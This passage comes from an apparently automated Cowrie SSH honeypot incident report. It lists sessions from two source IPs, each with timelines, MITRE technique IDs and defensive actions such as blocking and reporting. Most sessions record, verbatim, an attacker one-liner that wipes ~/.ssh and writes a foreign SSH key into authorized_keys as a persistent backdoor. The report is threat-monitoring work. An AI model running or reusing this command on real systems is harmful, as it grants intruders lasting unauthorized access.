| `2026-05-16 17:04:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0faefa8d731

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-16 17:05 |
| **Last Seen** | 2026-05-16 17:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:05:45` | `cowrie.session.connect` |
| `2026-05-16 17:05:45` | `cowrie.client.version` |
| `2026-05-16 17:05:45` | `cowrie.client.kex` |
| `2026-05-16 17:05:45` | `cowrie.login.success` |
| `2026-05-16 17:05:46` | `cowrie.session.params` |
| `2026-05-16 17:05:46` | `cowrie.command.input` |
| `2026-05-16 17:05:46` | `cowrie.command.failed` |
| `2026-05-16 17:05:46` | `cowrie.log.closed` |
| `2026-05-16 17:05:46` | `cowrie.session.params` |
| `2026-05-16 17:05:46` | `cowrie.command.input` |
| `2026-05-16 17:05:46` | `cowrie.session.file_download` |
| `2026-05-16 17:05:46` | `cowrie.log.closed` |
| `2026-05-16 17:05:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7bd10ff3ae0

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-16 17:05 |
| **Last Seen** | 2026-05-16 17:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:05:48` | `cowrie.session.connect` |
| `2026-05-16 17:05:48` | `cowrie.client.version` |
| `2026-05-16 17:05:48` | `cowrie.client.kex` |
| `2026-05-16 17:05:49` | `cowrie.login.success` |
| `2026-05-16 17:05:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25b1f4b209fb

| Field | Detail |
|---|---|
| **Source IP** | `14.29.176[.]8` |
| **First Seen** | 2026-05-16 17:06 |
| **Last Seen** | 2026-05-16 17:07 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:06:54` | `cowrie.session.connect` |
| `2026-05-16 17:06:54` | `cowrie.client.version` |
| `2026-05-16 17:06:54` | `cowrie.client.kex` |
| `2026-05-16 17:06:57` | `cowrie.login.success` |
| `2026-05-16 17:06:57` | `cowrie.session.params` |
| `2026-05-16 17:06:57` | `cowrie.command.input` |
| `2026-05-16 17:06:57` | `cowrie.command.failed` |
| `2026-05-16 17:06:58` | `cowrie.log.closed` |
| `2026-05-16 17:06:58` | `cowrie.session.params` |
| `2026-05-16 17:06:58` | `cowrie.command.input` |
| `2026-05-16 17:06:59` | `cowrie.session.file_download` |
| `2026-05-16 17:06:59` | `cowrie.log.closed` |
| `2026-05-16 17:07:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.29.176[.]8` to AbuseIPDB if not already reported
- [ ] Block `14.29.176[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ca3924816b6

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-16 17:07 |
| **Last Seen** | 2026-05-16 17:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:07:03` | `cowrie.session.connect` |
| `2026-05-16 17:07:03` | `cowrie.client.version` |
| `2026-05-16 17:07:03` | `cowrie.client.kex` |
| `2026-05-16 17:07:04` | `cowrie.login.success` |
| `2026-05-16 17:07:04` | `cowrie.session.params` |
| `2026-05-16 17:07:04` | `cowrie.command.input` |
| `2026-05-16 17:07:04` | `cowrie.command.failed` |
| `2026-05-16 17:07:04` | `cowrie.log.closed` |
| `2026-05-16 17:07:04` | `cowrie.session.params` |
| `2026-05-16 17:07:04` | `cowrie.command.input` |
| `2026-05-16 17:07:05` | `cowrie.session.file_download` |
| `2026-05-16 17:07:05` | `cowrie.log.closed` |
| `2026-05-16 17:07:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bdde6f5606c

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-16 17:07 |
| **Last Seen** | 2026-05-16 17:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:07:06` | `cowrie.session.connect` |
| `2026-05-16 17:07:06` | `cowrie.client.version` |
| `2026-05-16 17:07:07` | `cowrie.client.kex` |
| `2026-05-16 17:07:07` | `cowrie.login.success` |
| `2026-05-16 17:07:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a994c279d87

| Field | Detail |
|---|---|
| **Source IP** | `14.29.176[.]8` |
| **First Seen** | 2026-05-16 17:07 |
| **Last Seen** | 2026-05-16 17:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:07:07` | `cowrie.session.connect` |
| `2026-05-16 17:07:07` | `cowrie.client.version` |
| `2026-05-16 17:07:07` | `cowrie.client.kex` |
| `2026-05-16 17:07:08` | `cowrie.login.success` |
| `2026-05-16 17:07:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.29.176[.]8` to AbuseIPDB if not already reported
- [ ] Block `14.29.176[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8455de010aac

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-16 17:08 |
| **Last Seen** | 2026-05-16 17:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:08:27` | `cowrie.session.connect` |
| `2026-05-16 17:08:27` | `cowrie.client.version` |
| `2026-05-16 17:08:27` | `cowrie.client.kex` |
| `2026-05-16 17:08:27` | `cowrie.login.success` |
| `2026-05-16 17:08:28` | `cowrie.session.params` |
| `2026-05-16 17:08:28` | `cowrie.command.input` |
| `2026-05-16 17:08:28` | `cowrie.command.failed` |
| `2026-05-16 17:08:28` | `cowrie.log.closed` |
| `2026-05-16 17:08:28` | `cowrie.session.params` |
| `2026-05-16 17:08:28` | `cowrie.command.input` |
| `2026-05-16 17:08:28` | `cowrie.session.file_download` |
| `2026-05-16 17:08:28` | `cowrie.log.closed` |
| `2026-05-16 17:08:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8515935583dd

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-16 17:08 |
| **Last Seen** | 2026-05-16 17:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:08:30` | `cowrie.session.connect` |
| `2026-05-16 17:08:30` | `cowrie.client.version` |
| `2026-05-16 17:08:30` | `cowrie.client.kex` |
| `2026-05-16 17:08:31` | `cowrie.login.success` |
| `2026-05-16 17:08:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79abf7272a4c

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-16 17:11 |
| **Last Seen** | 2026-05-16 17:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:11:10` | `cowrie.session.connect` |
| `2026-05-16 17:11:10` | `cowrie.client.version` |
| `2026-05-16 17:11:11` | `cowrie.client.kex` |
| `2026-05-16 17:11:11` | `cowrie.login.success` |
| `2026-05-16 17:11:11` | `cowrie.session.params` |
| `2026-05-16 17:11:11` | `cowrie.command.input` |
| `2026-05-16 17:11:11` | `cowrie.command.failed` |
| `2026-05-16 17:11:11` | `cowrie.log.closed` |
| `2026-05-16 17:11:12` | `cowrie.session.params` |
| `2026-05-16 17:11:12` | `cowrie.command.input` |
| `2026-05-16 17:11:12` | `cowrie.session.file_download` |
| `2026-05-16 17:11:12` | `cowrie.log.closed` |
| `2026-05-16 17:11:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c97f9aa1a686

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-16 17:11 |
| **Last Seen** | 2026-05-16 17:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:11:14` | `cowrie.session.connect` |
| `2026-05-16 17:11:14` | `cowrie.client.version` |
| `2026-05-16 17:11:14` | `cowrie.client.kex` |
| `2026-05-16 17:11:14` | `cowrie.login.success` |
| `2026-05-16 17:11:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8827df42f80

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-16 17:15 |
| **Last Seen** | 2026-05-16 17:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:15:09` | `cowrie.session.connect` |
| `2026-05-16 17:15:09` | `cowrie.client.version` |
| `2026-05-16 17:15:09` | `cowrie.client.kex` |
| `2026-05-16 17:15:10` | `cowrie.login.success` |
| `2026-05-16 17:15:10` | `cowrie.session.params` |
| `2026-05-16 17:15:10` | `cowrie.command.input` |
| `2026-05-16 17:15:10` | `cowrie.command.failed` |
| `2026-05-16 17:15:10` | `cowrie.log.closed` |
| `2026-05-16 17:15:11` | `cowrie.session.params` |
| `2026-05-16 17:15:11` | `cowrie.command.input` |
| `2026-05-16 17:15:11` | `cowrie.session.file_download` |
| `2026-05-16 17:15:11` | `cowrie.log.closed` |
| `2026-05-16 17:15:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-788d311eecb6

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-16 17:15 |
| **Last Seen** | 2026-05-16 17:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:15:12` | `cowrie.session.connect` |
| `2026-05-16 17:15:12` | `cowrie.client.version` |
| `2026-05-16 17:15:13` | `cowrie.client.kex` |
| `2026-05-16 17:15:13` | `cowrie.login.success` |
| `2026-05-16 17:15:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d1657a14887

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-16 17:16 |
| **Last Seen** | 2026-05-16 17:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:16:27` | `cowrie.session.connect` |
| `2026-05-16 17:16:27` | `cowrie.client.version` |
| `2026-05-16 17:16:27` | `cowrie.client.kex` |
| `2026-05-16 17:16:28` | `cowrie.login.success` |
| `2026-05-16 17:16:28` | `cowrie.session.params` |
| `2026-05-16 17:16:28` | `cowrie.command.input` |
| `2026-05-16 17:16:28` | `cowrie.command.failed` |
| `2026-05-16 17:16:28` | `cowrie.log.closed` |
| `2026-05-16 17:16:29` | `cowrie.session.params` |
| `2026-05-16 17:16:29` | `cowrie.command.input` |
| `2026-05-16 17:16:29` | `cowrie.session.file_download` |
| `2026-05-16 17:16:29` | `cowrie.log.closed` |
| `2026-05-16 17:16:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d501d010da6b

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-16 17:16 |
| **Last Seen** | 2026-05-16 17:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:16:31` | `cowrie.session.connect` |
| `2026-05-16 17:16:31` | `cowrie.client.version` |
| `2026-05-16 17:16:31` | `cowrie.client.kex` |
| `2026-05-16 17:16:31` | `cowrie.login.success` |
| `2026-05-16 17:16:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-962155b2480f

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-16 17:17 |
| **Last Seen** | 2026-05-16 17:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:17:43` | `cowrie.session.connect` |
| `2026-05-16 17:17:43` | `cowrie.client.version` |
| `2026-05-16 17:17:43` | `cowrie.client.kex` |
| `2026-05-16 17:17:44` | `cowrie.login.success` |
| `2026-05-16 17:17:44` | `cowrie.session.params` |
| `2026-05-16 17:17:44` | `cowrie.command.input` |
| `2026-05-16 17:17:44` | `cowrie.command.failed` |
| `2026-05-16 17:17:44` | `cowrie.log.closed` |
| `2026-05-16 17:17:44` | `cowrie.session.params` |
| `2026-05-16 17:17:44` | `cowrie.command.input` |
| `2026-05-16 17:17:45` | `cowrie.session.file_download` |
| `2026-05-16 17:17:45` | `cowrie.log.closed` |
| `2026-05-16 17:17:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4381a69b1d5c

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-16 17:17 |
| **Last Seen** | 2026-05-16 17:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:17:46` | `cowrie.session.connect` |
| `2026-05-16 17:17:46` | `cowrie.client.version` |
| `2026-05-16 17:17:47` | `cowrie.client.kex` |
| `2026-05-16 17:17:47` | `cowrie.login.success` |
| `2026-05-16 17:17:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dbc19f4ce9a

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-16 17:19 |
| **Last Seen** | 2026-05-16 17:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
